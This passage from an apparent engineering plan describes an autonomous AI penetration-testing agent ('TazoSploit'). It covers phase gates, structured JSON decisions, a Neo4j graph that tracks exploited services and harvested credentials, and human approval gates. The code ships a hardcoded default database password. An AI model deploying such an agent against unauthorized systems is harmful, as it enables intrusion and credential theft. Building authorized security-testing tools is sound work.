TazoSploit has a softer phase system (lines ~7380-7445 of `dynamic_agent.py`):

```python
# CURRENT: dynamic_agent.py line ~7380
def _advance_phase(self, new_phase: str) -> None:
    if new_phase in self.phase_order:
        self.phase_current = new_phase

def _enforce_phase_gate_before_llm(self) -> Optional[str]:
    # Budget-based phase transitions
    # Returns warning messages but doesn't HARD BLOCK anything
    # except _hard_block_scan() which blocks specific scan commands
```

The `_hard_block_scan()` method (line ~6863) does block scans in exploit phase, but it's regex-based and incomplete.

#### What to Implement

**File: `kali-executor/open-interpreter/phase_machine.py` (NEW)**

```python
"""
TazoSploit Phase State Machine

Hard phase gates that BLOCK tool usage outside allowed phases.
Replaces the soft budget-based system in dynamic_agent.py.
"""
from enum import Enum
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


class Phase(str, Enum):
    RECON = "RECON"
    VULN_DISCOVERY = "VULN_DISCOVERY"
    EXPLOITATION = "EXPLOITATION"
    POST_EXPLOIT = "POST_EXPLOIT"
    COMPLETE = "COMPLETE"


PHASE_ORDER = [Phase.RECON, Phase.VULN_DISCOVERY, Phase.EXPLOITATION, Phase.POST_EXPLOIT, Phase.COMPLETE]


@dataclass
class PhaseTransitionRequest:
    """Request to transition between phases."""
    from_phase: Phase
    to_phase: Phase
    reason: str
    planned_actions: List[str] = field(default_factory=list)
    requires_approval: bool = False
    approved: Optional[bool] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)


@dataclass
class PhaseState:
    """Tracks the current phase and transition history."""
    current: Phase = Phase.RECON
    history: List[Dict] = field(default_factory=list)
    pending_transition: Optional[PhaseTransitionRequest] = None
    iteration_counts: Dict[str, int] = field(default_factory=lambda: {
        'RECON': 0, 'VULN_DISCOVERY': 0, 'EXPLOITATION': 0, 'POST_EXPLOIT': 0
    })
    # Configurable limits (0 = no limit)
    phase_budgets: Dict[str, int] = field(default_factory=lambda: {
        'RECON': 15,
        'VULN_DISCOVERY': 20,
        'EXPLOITATION': 0,  # No limit on exploitation
        'POST_EXPLOIT': 30,
    })

    def can_advance_to(self, target: Phase) -> bool:
        """Check if transition to target phase is valid."""
        current_idx = PHASE_ORDER.index(self.current)
        target_idx = PHASE_ORDER.index(target)
        # Can advance forward or stay same. Can go backward only to RECON.
        return target_idx >= current_idx or target == Phase.RECON

    def advance(self, target: Phase, reason: str) -> bool:
        """Advance to target phase. Returns True if successful."""
        if not self.can_advance_to(target):
            logger.warning(f"Invalid phase transition: {self.current} -> {target}")
            return False
        self.history.append({
            'from': self.current.value,
            'to': target.value,
            'reason': reason,
            'timestamp': datetime.utcnow().isoformat()
        })
        self.current = target
        logger.info(f"Phase transition: {self.history[-1]['from']} -> {target.value} ({reason})")
        return True

    def increment_iteration(self) -> Optional[str]:
        """Increment iteration count for current phase. Returns warning if budget hit."""
        phase_name = self.current.value
        self.iteration_counts[phase_name] = self.iteration_counts.get(phase_name, 0) + 1
        budget = self.phase_budgets.get(phase_name, 0)
        if budget > 0 and self.iteration_counts[phase_name] >= budget:
            return f"Phase budget exhausted for {phase_name} ({budget} iterations)"
        return None

    def get_allowed_tools(self, tool_phase_map: Dict[str, List[str]]) -> List[str]:
        """Get list of tools allowed in current phase."""
        return [
            tool for tool, phases in tool_phase_map.items()
            if self.current.value in phases
        ]
```

**Integration into `dynamic_agent.py`:**

Replace the existing phase system. In `__init__`:

```python
# REPLACE existing phase tracking:
#   self.phase_current = "RECON"
#   self.phase_steps = {}
#   self.phase_limits = {}

# WITH:
from phase_machine import PhaseState, Phase
from tool_phase_map import DEFAULT_TOOL_PHASE_MAP, is_tool_allowed, get_blocked_reason

self.phase = PhaseState()
self.tool_phase_map = get_setting('TOOL_PHASE_MAP') or DEFAULT_TOOL_PHASE_MAP
```

In the main execution loop (around `_execute`), add hard blocking:

```python
# In _execute() or before command execution:
def _check_tool_phase_gate(self, command: str) -> Optional[str]:
    """Hard gate: block tools not allowed in current phase."""
    tool = self._detect_tool(command)  # existing method at line ~3099
    if not is_tool_allowed(tool, self.phase.current.value):
        return get_blocked_reason(tool, self.phase.current.value)
    return None
```

### 3B. Structured ReAct Output

#### What RedAmon Does

Every LLM turn must output JSON matching the `LLMDecision` Pydantic model (from `state.py`):

```python
class LLMDecision(BaseModel):
    thought: str          # Analysis of current situation
    reasoning: str        # Why this action was chosen
    action: ActionType    # "use_tool" | "transition_phase" | "complete" | "ask_user"
    tool_name: Optional[str]
    tool_args: Optional[dict]
    phase_transition: Optional[PhaseTransitionDecision]
    completion_reason: Optional[str]
    user_question: Optional[UserQuestionDecision]
    updated_todo_list: List[TodoItemUpdate]
    output_analysis: Optional[OutputAnalysisInline]
```

The LLM is prompted to output JSON and the response is parsed with retry logic (up to `LLM_PARSE_MAX_RETRIES` attempts).

#### What TazoSploit Has Now

Free-form text output. The agent writes natural language with embedded code blocks. Executable commands are extracted via regex in `_extract_executable()` (line ~3030):

```python
# CURRENT: line ~3030
def _extract_executable(self, response: str) -> List[Tuple[str, str]]:
    # Regex parsing of ```bash``` blocks from free-form text
    # Returns list of (exec_type, content) tuples
```

#### What to Implement

**File: `kali-executor/open-interpreter/structured_output.py` (NEW)**

```python
"""
Structured ReAct output for TazoSploit agent.

Forces the LLM to output structured JSON for each decision,
enabling reliable tool tracking, phase enforcement, and todo management.
"""
from typing import Optional, List, Dict, Any
from pydantic import BaseModel, Field, field_validator
from enum import Enum
import json
import logging

logger = logging.getLogger(__name__)


class ActionType(str, Enum):
    EXECUTE_COMMAND = "execute_command"
    EXECUTE_SCRIPT = "execute_script"
    TRANSITION_PHASE = "transition_phase"
    COMPLETE = "complete"
    ASK_USER = "ask_user"


class TodoStatus(str, Enum):
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    BLOCKED = "blocked"


class TodoItem(BaseModel):
    description: str
    status: TodoStatus = TodoStatus.PENDING
    priority: str = "medium"  # high, medium, low


class AgentDecision(BaseModel):
    """Structured output from each agent turn."""
    thought: str = Field(description="Analysis of current situation and findings")
    reasoning: str = Field(description="Why this specific action was chosen over alternatives")
    action: ActionType = Field(description="Type of action to take")

    # Command execution fields
    command: Optional[str] = Field(default=None, description="Shell command or script to execute")
    command_type: Optional[str] = Field(default=None, description="bash or python")
    tool_name: Optional[str] = Field(default=None, description="Primary tool being used")
    expected_outcome: Optional[str] = Field(default=None, description="What we expect this to produce")
    fallback_command: Optional[str] = Field(default=None, description="What to try if this fails")

    # Phase transition
    target_phase: Optional[str] = Field(default=None, description="Phase to transition to")
    transition_reason: Optional[str] = Field(default=None)

    # Completion
    completion_reason: Optional[str] = Field(default=None)

    # User question
    question: Optional[str] = Field(default=None)

    # Todo list
    updated_todo: List[TodoItem] = Field(default_factory=list)

    # Analysis of previous output (when present)
    output_analysis: Optional[str] = Field(default=None, description="Interpretation of previous command output")
    findings: List[str] = Field(default_factory=list, description="Key findings from output")

    # MITRE mapping
    mitre_technique: Optional[str] = Field(default=None, description="ATT&CK technique ID if applicable")


class OutputAnalysis(BaseModel):
    """Analysis of tool output after execution."""
    interpretation: str
    new_targets: List[str] = Field(default_factory=list)
    new_vulns: List[str] = Field(default_factory=list)
    new_creds: List[Dict] = Field(default_factory=list)
    exploit_succeeded: bool = False
    exploit_evidence: Optional[str] = None
    recommended_next: List[str] = Field(default_factory=list)


def parse_agent_decision(raw_text: str, max_retries: int = 3) -> Optional[AgentDecision]:
    """Parse LLM output into structured AgentDecision.

    Attempts JSON extraction first, falls back to regex parsing of
    free-form text (backward compatibility).
    """
    # Try JSON extraction
    json_str = _extract_json(raw_text)
    if json_str:
        try:
            data = json.loads(json_str)
            return AgentDecision.model_validate(data)
        except Exception as e:
            logger.warning(f"JSON parse failed: {e}")

    # Fallback: extract from free-form text (backward compat)
    return _parse_freeform(raw_text)


def _extract_json(text: str) -> Optional[str]:
    """Extract JSON block from text (handles ```json blocks and raw JSON)."""
    import re
    # Try ```json block first
    match = re.search(r'```(?:json)?\s*\n?(.*?)\n?```', text, re.DOTALL)
    if match:
        return match.group(1).strip()
    # Try raw JSON object
    match = re.search(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', text, re.DOTALL)
    if match:
        return match.group(0)
    return None


def _parse_freeform(text: str) -> Optional[AgentDecision]:
    """Parse free-form text into AgentDecision (backward compatibility)."""
    import re
    # Extract command from ```bash``` blocks
    commands = re.findall(r'```(?:bash|sh|shell)?\s*\n(.*?)\n```', text, re.DOTALL)
    if not commands:
        # Try ```python``` blocks
        commands = re.findall(r'```python\s*\n(.*?)\n```', text, re.DOTALL)
        if commands:
            return AgentDecision(
                thought=text[:500],
                reasoning="Parsed from free-form text",
                action=ActionType.EXECUTE_SCRIPT,
                command=commands[0],
                command_type="python",
            )
        return None

    return AgentDecision(
        thought=text[:500],
        reasoning="Parsed from free-form text",
        action=ActionType.EXECUTE_COMMAND,
        command=commands[0],
        command_type="bash",
    )


# System prompt addition to request structured output
STRUCTURED_OUTPUT_PROMPT = """
OUTPUT FORMAT: You MUST respond with a JSON object (no markdown, no explanation outside the JSON).

```json
{
    "thought": "Your analysis of the current situation",
    "reasoning": "Why you chose this specific action",
    "action": "execute_command",
    "command": "your shell command here",
    "command_type": "bash",
    "tool_name": "primary_tool_name",
    "expected_outcome": "What you expect this to produce",
    "fallback_command": "Alternative if this fails",
    "updated_todo": [
        {"description": "Task description", "status": "in_progress", "priority": "high"}
    ],
    "output_analysis": "Your interpretation of previous output (if any)",
    "findings": ["finding 1", "finding 2"],
    "mitre_technique": "T1234"
}
```

Valid action types: execute_command, execute_script, transition_phase, complete, ask_user
"""
```

**Integration into `dynamic_agent.py`:**

The structured output system should be OPTIONAL initially (controlled by a setting) to avoid breaking the existing agent loop. Phase in gradually:

```python
# In __init__:
self.use_structured_output = get_setting('USE_STRUCTURED_OUTPUT', False)

# In the main loop, after LLM response:
if self.use_structured_output:
    from structured_output import parse_agent_decision, STRUCTURED_OUTPUT_PROMPT
    decision = parse_agent_decision(response_text)
    if decision:
        # Use structured fields
        executables = [(decision.command_type or 'bash', decision.command)]
        self.current_tool = decision.tool_name
        # ... etc
    else:
        # Fallback to existing regex extraction
        executables = self._extract_executable(response_text)
else:
    executables = self._extract_executable(response_text)
```

### 3C. Neo4j Knowledge Graph

#### What RedAmon Does

Full Neo4j integration via `graph_db/neo4j_client.py` (4080+ lines):

**Schema Nodes:** Domain, Subdomain, IP, Port, Service, BaseURL, Technology, Header, Endpoint, Parameter, Vulnerability, CVE, MitreData, Capec, Exploit, ExploitGvm, Certificate, GithubHunt, GithubRepository, GithubPath, GithubSecret

**Key relationships:**
```
(Subdomain)-[:BELONGS_TO]->(Domain)
(Subdomain)-[:RESOLVES_TO]->(IP)
(IP)-[:HAS_PORT]->(Port)
(Port)-[:RUNS_SERVICE]->(Service)
(Service)-[:SERVES_URL]->(BaseURL)
(BaseURL)-[:USES_TECHNOLOGY]->(Technology)
(BaseURL)-[:HAS_HEADER]->(Header)
(BaseURL)-[:HAS_ENDPOINT]->(Endpoint)
(Endpoint)-[:HAS_PARAMETER]->(Parameter)
(Technology)-[:HAS_CVE]->(CVE)
(CVE)-[:HAS_CWE]->(MitreData)
(Exploit)-[:TARGETED_IP]->(IP)
(Exploit)-[:EXPLOITED_CVE]->(CVE)
(Exploit)-[:VIA_PORT]->(Port)
```

**Text-to-Cypher:** The agent can query the graph using natural language, which an LLM translates to Cypher queries (from `tools.py`). Multi-tenant filtering (`user_id`, `project_id`) is injected into every query.

**Exploit node writer** (`exploit_writer.py`): When exploitation succeeds, creates an Exploit node with:
- Deterministic ID (5-minute time bucket for idempotency)
- Links to CVE, IP, Port nodes
- Metasploit module/payload extraction from execution trace
- Evidence text

#### What to Implement

**File: `kali-executor/open-interpreter/knowledge_graph.py` (NEW)**

```python
"""
TazoSploit Knowledge Graph — Neo4j integration for attack surface tracking.

Simplified schema focused on TazoSploit's needs:
- Track hosts, services, vulnerabilities across the attack surface
- Record exploitation attempts and results
- Enable "what haven't I tried?" queries
- Store credentials for reuse across services
"""
import os
import re
import json
import time
import logging
from typing import Optional, List, Dict, Any
from dataclasses import dataclass

logger = logging.getLogger(__name__)

# Neo4j driver (lazy init)
_driver = None


def get_driver():
    """Get or create Neo4j driver singleton."""
    global _driver
    if _driver is None:
        try:
            from neo4j import GraphDatabase
            uri = os.getenv('NEO4J_URI', 'bolt://neo4j:7687')
            user = os.getenv('NEO4J_USER', 'neo4j')
            password = os.getenv('NEO4J_PASSWORD', 'changeme123')
            _driver = GraphDatabase.driver(uri, auth=(user, password))
            logger.info(f"Connected to Neo4j at {uri}")
        except Exception as e:
            logger.warning(f"Neo4j not available: {e}")
    return _driver


def close_driver():
    """Close Neo4j driver."""
    global _driver
    if _driver:
        _driver.close()
        _driver = None


class KnowledgeGraph:
    """TazoSploit knowledge graph interface."""

    def __init__(self, job_id: str, user_id: str = "default"):
        self.job_id = job_id
        self.user_id = user_id
        self.driver = get_driver()
        if self.driver:
            self._init_schema()

    def _init_schema(self):
        """Initialize constraints and indexes."""
        if not self.driver:
            return
        constraints = [
            "CREATE CONSTRAINT host_unique IF NOT EXISTS FOR (h:Host) REQUIRE (h.ip, h.job_id) IS UNIQUE",
            "CREATE CONSTRAINT service_unique IF NOT EXISTS FOR (s:Service) REQUIRE (s.port, s.host_ip, s.job_id) IS UNIQUE",
            "CREATE CONSTRAINT vuln_unique IF NOT EXISTS FOR (v:Vulnerability) REQUIRE v.id IS UNIQUE",
            "CREATE CONSTRAINT cred_unique IF NOT EXISTS FOR (c:Credential) REQUIRE c.id IS UNIQUE",
            "CREATE CONSTRAINT exploit_unique IF NOT EXISTS FOR (e:ExploitAttempt) REQUIRE e.id IS UNIQUE",
        ]
        try:
            with self.driver.session() as session:
                for q in constraints:
                    try:
                        session.run(q)
                    except Exception:
                        pass  # Already exists
        except Exception as e:
            logger.warning(f"Schema init failed: {e}")

    @property
    def available(self) -> bool:
        return self.driver is not None

    # ── WRITE OPERATIONS ──

    def add_host(self, ip: str, hostname: str = None, os_info: str = None):
        """Add or update a host node."""
        if not self.driver:
            return
        with self.driver.session() as session:
            session.run(
                """
                MERGE (h:Host {ip: $ip, job_id: $job_id})
                SET h.hostname = COALESCE($hostname, h.hostname),
                    h.os = COALESCE($os, h.os),
                    h.user_id = $user_id,
                    h.updated_at = datetime()
                """,
                ip=ip, job_id=self.job_id, user_id=self.user_id,
                hostname=hostname, os=os_info
            )

    def add_service(self, host_ip: str, port: int, protocol: str = "tcp",
                    name: str = None, version: str = None, banner: str = None):
        """Add or update a service on a host."""
        if not self.driver:
            return
        with self.driver.session() as session:
            # Create service
            session.run(
                """
                MERGE (s:Service {port: $port, host_ip: $host_ip, job_id: $job_id})
                SET s.protocol = $protocol,
                    s.name = COALESCE($name, s.name),
                    s.version = COALESCE($version, s.version),
                    s.banner = COALESCE($banner, s.banner),
                    s.user_id = $user_id,
                    s.updated_at = datetime()
                """,
                port=port, host_ip=host_ip, job_id=self.job_id,
                protocol=protocol, name=name, version=version,
                banner=banner, user_id=self.user_id
            )
            # Link to host
            session.run(
                """
                MATCH (h:Host {ip: $host_ip, job_id: $job_id})
                MATCH (s:Service {port: $port, host_ip: $host_ip, job_id: $job_id})
                MERGE (h)-[:RUNS]->(s)
                """,
                host_ip=host_ip, port=port, job_id=self.job_id
            )

    def add_vulnerability(self, host_ip: str, port: int, vuln_type: str,
                          cve: str = None, severity: str = "medium",
                          details: str = None):
        """Add a vulnerability linked to a service."""
        if not self.driver:
            return
        import uuid
        vuln_id = f"vuln-{host_ip}-{port}-{vuln_type}-{self.job_id}"[:80]
        with self.driver.session() as session:
            session.run(
                """
                MERGE (v:Vulnerability {id: $vuln_id})
                SET v.type = $vuln_type,
                    v.cve = $cve,
                    v.severity = $severity,
                    v.details = $details,
                    v.host_ip = $host_ip,
                    v.port = $port,
                    v.job_id = $job_id,
                    v.user_id = $user_id,
                    v.verified = false,
                    v.updated_at = datetime()
                """,
                vuln_id=vuln_id, vuln_type=vuln_type, cve=cve,
                severity=severity, details=details, host_ip=host_ip,
                port=port, job_id=self.job_id, user_id=self.user_id
            )
            # Link to service
            session.run(
                """
                MATCH (s:Service {port: $port, host_ip: $host_ip, job_id: $job_id})
                MATCH (v:Vulnerability {id: $vuln_id})
                MERGE (s)-[:HAS_VULN]->(v)
                """,
                port=port, host_ip=host_ip, job_id=self.job_id, vuln_id=vuln_id
            )

    def add_credential(self, username: str, password: str = None,
                       hash_value: str = None, source: str = None,
                       service_port: int = None, host_ip: str = None):
        """Add a discovered credential."""
        if not self.driver:
            return
        cred_id = f"cred-{username}-{host_ip or 'any'}-{service_port or 0}-{self.job_id}"[:80]
        with self.driver.session() as session:
            session.run(
                """
                MERGE (c:Credential {id: $cred_id})
                SET c.username = $username,
                    c.password = $password,
                    c.hash = $hash_value,
                    c.source = $source,
                    c.job_id = $job_id,
                    c.user_id = $user_id,
                    c.updated_at = datetime()
                """,
                cred_id=cred_id, username=username, password=password,
                hash_value=hash_value, source=source,
                job_id=self.job_id, user_id=self.user_id
            )
            # Link to service if known
            if host_ip and service_port:
                session.run(
                    """
                    MATCH (s:Service {port: $port, host_ip: $host_ip, job_id: $job_id})
                    MATCH (c:Credential {id: $cred_id})
                    MERGE (c)-[:WORKS_ON]->(s)
                    """,
                    port=service_port, host_ip=host_ip,
                    job_id=self.job_id, cred_id=cred_id
                )

    def record_exploit_attempt(self, host_ip: str, port: int, tool: str,
                               command: str, success: bool,
                               evidence: str = None, cve: str = None):
        """Record an exploitation attempt (success or failure)."""
        if not self.driver:
            return
        time_bucket = int(time.time()) // 300  # 5-min bucket for idempotency
        attempt_id = f"attempt-{host_ip}-{port}-{tool}-{time_bucket}-{self.job_id}"[:100]
        with self.driver.session() as session:
            session.run(
                """
                MERGE (a:ExploitAttempt {id: $attempt_id})
                SET a.tool = $tool,
                    a.command = $command,
                    a.success = $success,
                    a.evidence = $evidence,
                    a.cve = $cve,
                    a.host_ip = $host_ip,
                    a.port = $port,
                    a.job_id = $job_id,
                    a.user_id = $user_id,
                    a.timestamp = datetime()
                """,
                attempt_id=attempt_id, tool=tool, command=command,
                success=success, evidence=evidence, cve=cve,
                host_ip=host_ip, port=port,
                job_id=self.job_id, user_id=self.user_id
            )
            # Link to vulnerability if CVE matches
            if cve:
                session.run(
                    """
                    MATCH (v:Vulnerability {job_id: $job_id})
                    WHERE v.cve = $cve OR v.type CONTAINS $cve
                    MATCH (a:ExploitAttempt {id: $attempt_id})
                    MERGE (v)-[:EXPLOITED_BY]->(a)
                    """,
                    job_id=self.job_id, cve=cve, attempt_id=attempt_id
                )

    # ── READ OPERATIONS (for agent context) ──

    def get_unexploited_services(self) -> List[Dict]:
        """Get services that haven't been successfully exploited."""
        if not self.driver:
            return []
        with self.driver.session() as session:
            result = session.run(
                """
                MATCH (h:Host {job_id: $job_id})-[:RUNS]->(s:Service)
                WHERE NOT EXISTS {
                    MATCH (s)<-[:HAS_VULN]-(v)-[:EXPLOITED_BY]->(a:ExploitAttempt)
                    WHERE a.success = true
                }
                OPTIONAL MATCH (s)-[:HAS_VULN]->(v:Vulnerability)
                RETURN h.ip AS ip, s.port AS port, s.name AS service,
                       s.version AS version,
                       collect(DISTINCT v.type) AS vulns,
                       collect(DISTINCT v.cve) AS cves
                ORDER BY size(collect(DISTINCT v.type)) DESC
                """,
                job_id=self.job_id
            )
            return [dict(r) for r in result]

    def get_unattempted_services(self) -> List[Dict]:
        """Get services with NO exploitation attempts at all."""
        if not self.driver:
            return []
        with self.driver.session() as session:
            result = session.run(
                """
                MATCH (h:Host {job_id: $job_id})-[:RUNS]->(s:Service)
                WHERE NOT EXISTS {
                    MATCH (a:ExploitAttempt {host_ip: h.ip, port: s.port, job_id: $job_id})
                }
                RETURN h.ip AS ip, s.port AS port, s.name AS service,
                       s.version AS version
                """,
                job_id=self.job_id
            )
            return [dict(r) for r in result]

    def get_all_credentials(self) -> List[Dict]:
        """Get all discovered credentials."""
        if not self.driver:
            return []
        with self.driver.session() as session:
            result = session.run(
                """
                MATCH (c:Credential {job_id: $job_id})
                OPTIONAL MATCH (c)-[:WORKS_ON]->(s:Service)
                RETURN c.username AS username, c.password AS password,
                       c.hash AS hash, c.source AS source,
                       s.port AS port, s.host_ip AS host_ip
                """,
                job_id=self.job_id
            )
            return [dict(r) for r in result]

    def get_attack_surface_summary(self) -> str:
        """Get a text summary of the current attack surface for LLM context."""
        if not self.driver:
            return "Knowledge graph not available."

        lines = ["=== ATTACK SURFACE SUMMARY ==="]

        # Hosts and services
        with self.driver.session() as session:
            hosts = session.run(
                """
                MATCH (h:Host {job_id: $job_id})-[:RUNS]->(s:Service)
                RETURN h.ip AS ip, h.hostname AS hostname, h.os AS os,
                       collect({port: s.port, name: s.name, version: s.version}) AS services
                """,
                job_id=self.job_id
            )
            for host in hosts:
                h = dict(host)
                lines.append(f"\n[HOST] {h['ip']}" + (f" ({h['hostname']})" if h['hostname'] else ""))
                if h['os']:
                    lines.append(f"  OS: {h['os']}")
                for svc in h['services']:
                    lines.append(f"  Port {svc['port']}: {svc['name'] or 'unknown'} {svc['version'] or ''}")

        # Vulnerabilities
        with self.driver.session() as session:
            vulns = session.run(
                """
                MATCH (v:Vulnerability {job_id: $job_id})
                OPTIONAL MATCH (v)-[:EXPLOITED_BY]->(a:ExploitAttempt)
                RETURN v.type AS type, v.cve AS cve, v.severity AS severity,
                       v.host_ip AS ip, v.port AS port, v.verified AS verified,
                       collect(CASE WHEN a IS NOT NULL THEN {tool: a.tool, success: a.success} END) AS attempts
                ORDER BY
                    CASE v.severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 ELSE 3 END
                """,
                job_id=self.job_id
            )
            vuln_list = [dict(v) for v in vulns]
            if vuln_list:
                lines.append("\n=== VULNERABILITIES ===")
                for v in vuln_list:
                    status = "EXPLOITED" if any(a and a.get('success') for a in v['attempts']) else \
                             "ATTEMPTED" if v['attempts'] and v['attempts'][0] else "NOT ATTEMPTED"
                    lines.append(f"  [{v['severity'].upper()}] {v['type']}" +
                                (f" ({v['cve']})" if v['cve'] else "") +
                                f" on {v['ip']}:{v['port']} — {status}")

        # Credentials
        creds = self.get_all_credentials()
        if creds:
            lines.append("\n=== CREDENTIALS ===")
            for c in creds:
                lines.append(f"  {c['username']}:{c['password'] or c['hash'] or '???'}" +
                            (f" @ {c['host_ip']}:{c['port']}" if c['host_ip'] else "") +
                            (f" (from {c['source']})" if c['source'] else ""))

        # Unexploited services
        unexploited = self.get_unexploited_services()
        if unexploited:
            lines.append(f"\n=== UNEXPLOITED SERVICES ({len(unexploited)}) ===")
            for svc in unexploited[:10]:
                lines.append(f"  {svc['ip']}:{svc['port']} ({svc['service'] or 'unknown'})" +
                            (f" — vulns: {', '.join(svc['vulns'])}" if svc['vulns'] else ""))

        return "\n".join(lines)
```

**Docker-compose addition:**

```yaml
# Add to docker-compose.yml under services:
  neo4j:
    image: neo4j:5.26-community
    container_name: tazosploit-neo4j
    environment:
      - NEO4J_AUTH=neo4j/${NEO4J_PASSWORD:-changeme123}
      - NEO4J_PLUGINS=["apoc"]
      - NEO4J_dbms_security_procedures_unrestricted=apoc.*
      - NEO4J_dbms_security_procedures_allowlist=apoc.*
    ports:
      - "7474:7474"
      - "7687:7687"
    volumes:
      - neo4j-data:/data
    networks:
      - exec-net
      - control-net
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:7474"]
      interval: 10s
      timeout: 5s
      retries: 5
    restart: unless-stopped

# Add to volumes:
  neo4j-data:
```

**Integration into `dynamic_agent.py`:**

```python
# In __init__, after Redis setup:
from knowledge_graph import KnowledgeGraph
self.kg = KnowledgeGraph(job_id=self.session_id, user_id="default")

# After every command execution (in _save_execution or _build_feedback):
# Parse output and update graph
self._update_knowledge_graph(execution)

# Before every LLM call (context injection):
if self.kg.available:
    kg_summary = self.kg.get_attack_surface_summary()
    # Inject into conversation as system message
```

### 3D. Tool Phase Restrictions

Covered in section 2.1.6 above. The `tool_phase_map.py` module provides the mapping and the `_check_tool_phase_gate()` method enforces it.

### 3E. Approval Gates

#### What RedAmon Does

From `websocket_api.py`, the WebSocket protocol includes:

**Client → Server:**
- `APPROVAL` message with `decision` (approve/modify/abort) and optional `modification`
- `ANSWER` message with answer text for agent questions
- `GUIDANCE` message for steering the agent mid-task

**Server → Client:**
- `APPROVAL_REQUEST` with phase transition details (from_phase, to_phase, reason, planned_actions, risks)
- `QUESTION_REQUEST` with question text, context, format (text/single_choice/multi_choice), options

The `WebSocketConnection` class manages state per-connection with guidance queue drain.

#### What TazoSploit Has Now

WebSocket exists (`self.websocket` in `DynamicAgent.__init__`) with `_send_websocket_update()` (line ~783). But only sends status updates, not approval requests.

Supervisor hints system (`_read_supervisor_hints()`, `_apply_supervisor_directives()`) provides reactive control — but no blocking approval flow.

#### What to Implement

**File: `kali-executor/open-interpreter/approval_gate.py` (NEW)**

```python
"""
Approval gate system for TazoSploit.

Integrates with existing WebSocket to add blocking approval flows
for phase transitions and dangerous commands.
"""
import asyncio
import json
import logging
from typing import Optional, Dict, Any
from datetime import datetime

logger = logging.getLogger(__name__)


class ApprovalGate:
    """Manages approval requests via WebSocket."""

    def __init__(self, websocket=None, redis_client=None, job_id: str = None):
        self.websocket = websocket
        self.redis = redis_client
        self.job_id = job_id
        self.pending_approval: Optional[Dict] = None
        self.approval_response: Optional[Dict] = None
        self.approval_timeout = 300  # 5 minutes

    async def request_approval(self, request_type: str, details: Dict) -> Dict:
        """Send approval request and wait for response.

        Args:
            request_type: 'phase_transition' or 'dangerous_command'
            details: Request details (from_phase, to_phase, reason, etc.)

        Returns:
            {'decision': 'approve'|'modify'|'abort', 'modification': str|None}
        """
        request_id = f"{self.job_id}-{int(datetime.utcnow().timestamp())}"
        self.pending_approval = {
            'request_id': request_id,
            'type': request_type,
            'details': details,
            'timestamp': datetime.utcnow().isoformat(),
        }

        # Send via WebSocket
        if self.websocket:
            await self.websocket.send_json({
                'type': 'APPROVAL_REQUEST',
                'payload': self.pending_approval,
            })

        # Also store in Redis for API-based approval
        if self.redis:
            self.redis.set(
                f"job:{self.job_id}:pending_approval",
                json.dumps(self.pending_approval),
                ex=self.approval_timeout
            )

        # Wait for response (poll Redis or receive via WebSocket)
        return await self._wait_for_approval(request_id)

    async def _wait_for_approval(self, request_id: str, timeout: int = 300) -> Dict:
        """Wait for approval response, polling Redis."""
        import time
        deadline = time.time() + timeout
        while time.time() < deadline:
            # Check Redis for response
            if self.redis:
                raw = self.redis.get(f"job:{self.job_id}:approval_response")
                if raw:
                    response = json.loads(raw)
                    if response.get('request_id') == request_id:
                        self.redis.delete(f"job:{self.job_id}:pending_approval")
                        self.redis.delete(f"job:{self.job_id}:approval_response")
                        self.pending_approval = None
                        return response
            await asyncio.sleep(1)

        # Timeout — default to abort
        logger.warning(f"Approval request {request_id} timed out")
        return {'decision': 'abort', 'modification': None}

    def check_approval_sync(self) -> Optional[Dict]:
        """Non-async check for approval response (for synchronous agent loop)."""
        if not self.redis or not self.pending_approval:
            return None
        raw = self.redis.get(f"job:{self.job_id}:approval_response")
        if raw:
            response = json.loads(raw)
            if response.get('request_id') == self.pending_approval.get('request_id'):
                self.redis.delete(f"job:{self.job_id}:pending_approval")
                self.redis.delete(f"job:{self.job_id}:approval_response")
                self.pending_approval = None
                return response
        return None
```

### 3F. Execution Trace

#### What RedAmon Does

Every agent step is recorded as an `ExecutionStep` (from `state.py`):

```python
class ExecutionStep(BaseModel):
    step_id: str
    iteration: int
    timestamp: datetime
    phase: Phase
    thought: str
    reasoning: str
    tool_name: Optional[str]
    tool_args: Optional[dict]
    tool_output: Optional[str]
    output_analysis: Optional[str]
    success: bool
    error_message: Optional[str]
```

The last N steps (configurable via `EXECUTION_TRACE_MEMORY_STEPS`) are formatted and included in the LLM context via `format_execution_trace()`.

#### What TazoSploit Has Now

TazoSploit has `self.executions: List[Execution]` (line ~430) with the `Execution` dataclass (line ~305):

```python
@dataclass
class Execution:
    exec_type: str       # bash, python, etc.
    content: str         # The command
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    timestamp: str = ""
    iteration: int = 0
    tool: str = ""
    target: str = ""
    duration_s: float = 0.0
    mitre_ids: List[str] = field(default_factory=list)
```

This is close but missing: thought, reasoning, output_analysis, phase, success flag.

#### What to Implement

Extend the existing `Execution` dataclass:

```python
# MODIFY: dynamic_agent.py line ~305
@dataclass
class Execution:
    exec_type: str
    content: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    timestamp: str = ""
    iteration: int = 0
    tool: str = ""
    target: str = ""
    duration_s: float = 0.0
    mitre_ids: List[str] = field(default_factory=list)
    # NEW FIELDS:
    phase: str = ""               # Phase when executed
    thought: str = ""             # LLM's reasoning before this action
    reasoning: str = ""           # Why this specific action
    output_analysis: str = ""     # LLM's interpretation after execution
    success: bool = True          # Whether the command succeeded
    error_message: str = ""       # Error details if failed
    findings: List[str] = field(default_factory=list)  # Key findings extracted
```

Add execution trace formatting:

```python
# NEW METHOD in DynamicAgent:
def _format_execution_trace(self, last_n: int = None) -> str:
    """Format recent execution history for LLM context."""
    limit = last_n or get_setting('EXECUTION_TRACE_MEMORY_STEPS', 100)
    recent = self.executions[-limit:] if len(self.executions) > limit else self.executions

    lines = []
    if len(self.executions) > limit:
        lines.append(f"[Showing last {limit} of {len(self.executions)} steps]")

    for ex in recent:
        status = "OK" if ex.success else "FAILED"
        lines.append(f"--- Step {ex.iteration} [{ex.phase}] {status} ---")
        if ex.thought:
            lines.append(f"Thought: {ex.thought[:500]}")
        lines.append(f"Tool: {ex.tool} | Command: {ex.content[:200]}")
        if ex.stdout:
